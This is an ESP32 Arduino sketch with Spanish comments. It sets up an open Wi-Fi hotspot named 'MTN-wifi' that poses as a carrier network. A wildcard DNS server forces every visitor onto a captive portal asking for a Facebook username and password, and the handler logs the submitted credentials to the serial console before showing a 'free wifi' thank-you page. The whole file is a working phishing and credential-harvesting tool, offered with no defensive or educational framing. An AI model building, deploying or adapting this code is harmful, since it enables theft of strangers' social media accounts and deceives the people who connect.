//incluir librerias para....

//crear un punto de acceso wifi
#include <WiFi.h>
#include <WiFiAP.h>

//crear un servidor web y configurar el redireccionamiento
#include <WebServer.h>
#include <DNSServer.h>

//estos pueden ser utiles si se decide implementar comunicación entre placas
#include <HTTPClient.h>
#include <NetworkClientSecure.h>
#include <NetworkClient.h>


//definir pines para los LED
#define CLIENT_LED 5
#define ACTIVE_LED 2

/***********************************************
* El pin 2 servirá para comprobar que todo sigue
* funcionando.
*
************************************************/


//variable para el nombre del wifi
const char* ssid    = "MTN-wifi";
//hay la possibilidad de declarar también una variable password para crear una red privada en lugar de una publica

//variables para el puerto de DNS
const byte DNS_PORT = 53;

//variable para iniciar un servidor en el puerto 80 (http)
WebServer server(80);

//variable para servidor DNS
DNSServer dnsserver;


//IPAddress gateway(192,168,1,1);
//IPAddress subnet(255,255,255,0);

//pagina que saltará al conectarse a la wifi
const char* htmlPage = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wifi Access Authentication</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f3f4f6;
    }
    .container {
      width: 90%;
      max-width: 400px;
      padding: 20px;
      background-color: #ffffff;
      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      text-align: center;
    }
    h2 {
      color: #333;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    label {
      margin: 10px 0 5px;
      text-align: left;
      color: #666;
      font-size: 14px;
    }
    input[type="text"],
    input[type="password"] {
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
    }
    input[type="submit"] {
      padding: 12px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    input[type="submit"]:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Authentication required</h2>
    <form action="/submit" method="POST">
      <label for="username">Facebook Username</label>
      <input type="text" id="username" name="username" placeholder="Enter username" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter password" required>

      <input type="submit" value="Connect">
    </form>
  </div>
</body>
</html>
)=====";


//pagina a la que se redigirá después de haber ingresado los datos
const char *thankYouPage = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wifi Access Authentication</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f3f4f6;
    }
    .container {
      width: 90%;
      max-width: 400px;
      padding: 20px;
      background-color: #ffffff;
      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
      text-align: center;
    }
    h2 {
      color: #333;
      margin-bottom: 10px;
    }
    p {
      color: #666;
      font-size: 16px;
    }
    a {
      display: inline-block;
      margin-top: 20px;
      padding: 10px 20px;
      color: white;
      background-color: #4CAF50;
      text-decoration: none;
      border-radius: 4px;
      transition: background-color 0.3s;
    }
    a:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Thank You for connecting!</h2>
    <p>Enjoy the free wifi.</p>
    <a href="/">Exit</a>
  </div>
</body>
</html>
)=====";


void setup() {
  Serial.begin(115200);
  delay(3000);

  Serial.println("Configurando el punto de acceso.....");

  pinMode(CLIENT_LED, OUTPUT);
  pinMode(ACTIVE_LED, OUTPUT);

  //se crea un punto de acceso con el nombre declarado más arriba
  if(!WiFi.softAP(ssid)) //está función accepta un segundo parametro opcional que será la contraseña del wifi
  {
    log_e("La creación Soft AP ha fallado."); 
    while(1);
  }

  //se inicia el servidor DNS para redireccionar todas las solicitudes realizadas en la red
  dnsserver.start(DNS_PORT, "*", WiFi.softAPIP());

  //variable para almacenar la dirección IP de la red
  IPAddress myIP = WiFi.softAPIP();

  //imprimir por pantalla la dirección IP de la red
  Serial.print("AP IP address: ");
  Serial.println(myIP);

  //se define la pagina raiz del servidor y llama a la función handleRoot
  server.on("/", handleRoot);

  //cada vez que hay un submit se llama a la función handleSubmit
  server.on("/submit", handleSubmit);

  //
  server.onNotFound(handleRoot);

  //se inicia el servidor
  server.begin();

  Serial.println("Server started!");
}

void loop() {
  //se enciede la luz para comprobar que se está ejecutando
  digitalWrite(ACTIVE_LED, HIGH);

  dnsserver.processNextRequest();
  server.handleClient();
  //NetworkClient client = server.accept();
  //digitalWrite(CLIENT_LED, LOW);

/*
  if (client)
  {
    Serial.println("New client.");
    String currentline = "";
    digitalWrite(CLIENT_LED, HIGH);

    while(client.connected())
    {
      if (client.available())
      {
        char c = client.read();
        Serial.write(c);
        if(c=='\n')
        {
          if(currentline.length()==0)
          {
            client.println("HTTP/1.1 200 OK");
            client.println("content-type:text/html");
            client.println();

            client.print("Click <a href=\"/H\">here</a> to turn ON the LED.<br>");
            client.print("Click <a href=\"/L\">here</a> to turn OFF the LED.<br>");

            client.println();

            break;
          } else {
            currentline = "";
          }
        }
        else if(c!='\r')
        {
          currentline += c;
        }

        if(currentline.endsWith("Get /H"))
        {
          digitalWrite(CLIENT_LED, HIGH);
        }
        if(currentline.endsWith("Get /L"))
        {
          digitalWrite(CLIENT_LED, LOW);
        }
      }
    }

    client.stop();
    Serial.println("Client disconnected.");
  }*/
}


/***********************************************************************************
* 
*
*
*
************************************************************************************/
void handleRoot() {
  //se envia una respueta con la primera pagina a cada solicitud de conexión
  server.send(200, "text/html", htmlPage);
}

/***********************************************************************************
* Función para gestionar las entradas de usuario.
* Se llamará a esta función cada vez que un usuario sube el formulario con los datos
* solicitados.
*
************************************************************************************/
void handleSubmit()
{
  //variables para almacenar temporalmente las entradas del usuario
  String username = server.arg("username");
  String password = server.arg("password");

  //se imprime por consola los valores de las entradas
  Serial.println("Facebook id: "+ username);
  Serial.println("Password: "+ password);

  //se envia una respuesta con la segunda pagina
  server.send(200, "text/html", thankYouPage);
}